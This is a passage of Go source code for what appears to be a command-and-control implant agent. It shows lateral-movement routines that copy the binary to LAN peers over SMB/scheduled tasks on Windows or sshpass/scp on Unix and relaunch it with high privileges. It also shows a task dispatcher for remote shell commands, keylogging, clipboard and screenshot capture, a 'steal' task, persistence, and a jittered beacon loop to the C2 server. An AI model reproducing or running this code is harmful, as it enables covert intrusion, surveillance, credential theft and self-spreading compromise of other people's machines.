		` --interval ` + strconv.Itoa(int(interval.Seconds())) + ` --jitter ` + strconv.Itoa(int(jitter.Seconds()))
	sh, rc = runShell(`schtasks /Create /S `+host+` /TN "c2agent-lateral" /TR "`+relaunch+`" /SC ONLOGON /RU `+user+` /RP `+pass+` /RL HIGHEST /F`, 30)
	runShell(`net use "`+share+`" /delete /y`, 20)
	if rc != 0 {
		return "deployed (file dropped; task: " + firstLine(sh) + ")"
	}
	return "deployed (file dropped + scheduled c2agent-lateral)"
}

func lateralDeployUnix(host, user, pass, self string) string {
	_, rc := runShell("command -v sshpass", 10)
	if rc != 0 {
		return "skipped (sshpass not installed)"
	}
	name := filepath.Base(self)
	relaunch := `'/tmp/` + name + `' --server ` + server + ` --token ` + token +
		` --interval ` + strconv.Itoa(int(interval.Seconds())) + ` --jitter ` + strconv.Itoa(int(jitter.Seconds()))
	sh, rc := runShell(`sshpass -p '`+pass+`' scp -o StrictHostKeyChecking=no -o ConnectTimeout=8 '`+self+`' `+user+`@`+host+`:/tmp/`+name, 60)
	if rc != 0 {
		return "failed (scp: " + firstLine(sh) + ")"
	}
	sh, rc = runShell(`sshpass -p '`+pass+`' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 `+user+`@`+host+` '`+relaunch+` &>/dev/null &'`, 30)
	if rc != 0 {
		return "deployed (file uploaded; launch: " + firstLine(sh) + ")"
	}
	return "deployed (file uploaded + launched)"
}

func lateralTask(args map[string]string) (string, int) {
	subnet := strings.TrimSpace(args["subnet"])
	user := strings.TrimSpace(args["user"])
	pass := strings.TrimSpace(args["pass"])
	if user == "" {
		user = strings.TrimSpace(os.Getenv("C2_LAT_USER"))
	}
	if pass == "" {
		pass = strings.TrimSpace(os.Getenv("C2_LAT_PASS"))
	}
	self, err := os.Executable()
	if err != nil || self == "" {
		self = os.Args[0]
	}
	peers := lanPeers(subnet)
	if len(peers) == 0 {
		return "lateral: no LAN peers found", 1
	}
	lines := []string{"lateral: " + strconv.Itoa(len(peers)) + " peer(s): " + strings.Join(peers, ",")}
	deployed, failed, skipped := 0, 0, 0
	for _, host := range peers {
		var status string
		if user == "" || pass == "" {
			status = "skipped (no credentials; set C2_LAT_USER/C2_LAT_PASS)"
			skipped++
		} else if runtime.GOOS == "windows" {
			status = lateralDeployWin(host, user, pass, self)
		} else {
			status = lateralDeployUnix(host, user, pass, self)
		}
		lines = append(lines, "  "+host+": "+status)
		switch {
		case strings.HasPrefix(status, "deployed"):
			deployed++
		case strings.HasPrefix(status, "skipped"):
			skipped++
		default:
			failed++
		}
	}
	lines = append(lines, fmt.Sprintf("lateral: deployed=%d failed=%d skipped=%d", deployed, failed, skipped))
	return strings.Join(lines, "\n"), 0
}

func execute(t c2Task) resultBody {
	res := resultBody{ExitCode: 0}
	switch t.Type {
	case "shell":
		timeout := shellTimeoutDefault
		if secs, err := strconv.Atoi(t.Args["timeout"]); err == nil && secs >= 1 {
			timeout = time.Duration(secs) * time.Second
		}
		res.Output, res.ExitCode = runShell(t.Args["command"], timeout)
	case "download":
		res.Output, res.ExitCode = download(t.TaskID, t.Args)
	case "upload":
		res.Output, res.ExitCode = upload(t.TaskID, t.Args)
	case "sleep":
		if secs, err := strconv.Atoi(t.Args["seconds"]); err == nil && secs >= 1 {
			interval = time.Duration(secs) * time.Second
		}
		res.Output = fmt.Sprintf("heartbeat interval set to %s", interval)
	case "keylog":
		action := t.Args["action"]
		if action == "" {
			action = "dump"
		}
		switch action {
		case "start":
			res.Output = klog.start()
		case "stop":
			res.Output = klog.stop()
		default:
			res.Output = klog.dump()
		}
	case "clipboard":
		action := t.Args["action"]
		if action == "" {
			action = "get"
		}
		if action == "set" {
			res.Output, res.ExitCode = clipboardSet(t.Args["text"])
		} else {
			res.Output, res.ExitCode = clipboardGet()
		}
	case "screenshot":
		res.Output, res.ExitCode = screenshot(t.TaskID, t.Args["name"])
	case "steal":
		res.Output, res.ExitCode = stealTask(t.TaskID, t.Args)
	case "clone":
		res.Output, res.ExitCode = cloneTask(t.Args)
	case "persistence":
		res.Output, res.ExitCode = persistenceTask(t.Args)
	case "lateral":
		res.Output, res.ExitCode = lateralTask(t.Args)
	case "exit":
		res.Output = "exiting"
	default:
		res.Output = "unknown task type: " + t.Type
		res.ExitCode = 1
	}
	return res
}

// ----------------------------------------------------------------- main

func main() {
	serverFlag := flag.String("server", os.Getenv("C2_SERVER"), "C2 server URL")
	tokenFlag := flag.String("token", os.Getenv("C2_TOKEN"), "agent token")
	intervalFlag := flag.Int("interval", 10, "heartbeat interval in seconds")
	jitterFlag := flag.Int("jitter", 0, "random jitter in seconds (added to interval)")
	stateFlag := flag.String("state", homeFile(".c2agent_go.json"), "state file")
	verboseFlag := flag.Bool("verbose", false, "print activity")
	flag.Parse()

	if *serverFlag == "" || *tokenFlag == "" {
		log.Fatal("usage: agent --server URL --token TOKEN [--interval N] [--jitter N] [--verbose]")
	}
	server = strings.TrimRight(*serverFlag, "/")
	token = *tokenFlag
	interval = time.Duration(*intervalFlag) * time.Second
	jitter = time.Duration(*jitterFlag) * time.Second
	stateFile = *stateFlag
	verbose = *verboseFlag

	loadID()
	if agentID == "" {
		if err := register(); err != nil {
			logf("register failed: %v — will retry on next checkin", err)
		}
	}

	for {
		tasks, err := checkin()
		if err != nil {
			if errors.Is(err, errAgentNotFound) {
				logf("agent unknown by server — re-registering")
				agentID = ""
				if err := register(); err != nil {
					logf("re-register failed: %v — will retry on next checkin", err)
				}
				continue
			}
			logf("checkin failed: %v", err)
		} else {
			for _, t := range tasks {
				logf("running task %s (%s)", t.TaskID, t.Type)
				res := execute(t)
				report(t, res)
				if t.Type == "exit" {
					logf("exit task received — shutting down")
					return
				}
			}
		}
		j := time.Duration(0)
		if jitter > 0 {
			j = time.Duration(rand.Intn(int(jitter.Seconds()))) * time.Second
		}
		time.Sleep(interval + j)
	}
}
